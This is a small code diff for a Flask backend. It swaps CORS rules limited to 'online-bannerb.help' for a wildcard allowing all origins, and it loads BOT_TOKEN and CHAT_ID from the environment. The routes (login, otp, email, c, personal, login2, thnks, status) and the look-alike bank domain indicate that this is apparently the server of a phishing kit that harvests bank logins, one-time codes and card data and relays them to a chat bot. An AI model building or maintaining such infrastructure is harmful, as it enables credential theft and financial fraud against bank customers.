@@ -8,16 +8,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 app = Flask(__name__)
-CORS(app, resources={
-    r"/login": {"origins": "https://online-bannerb.help"},
-    r"/otp": {"origins": "https://online-bannerb.help"},
-    r"/email": {"origins": "https://online-bannerb.help"},
-    r"/c": {"origins": "https://online-bannerb.help"},
-    r"/personal": {"origins": "https://online-bannerb.help"},
-    r"/login2": {"origins": "https://online-bannerb.help"},
-    r"/thnks": {"origins": "https://online-bannerb.help"},
-    r"/status/*": {"origins": "https://online-bannerb.help"}
-})
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
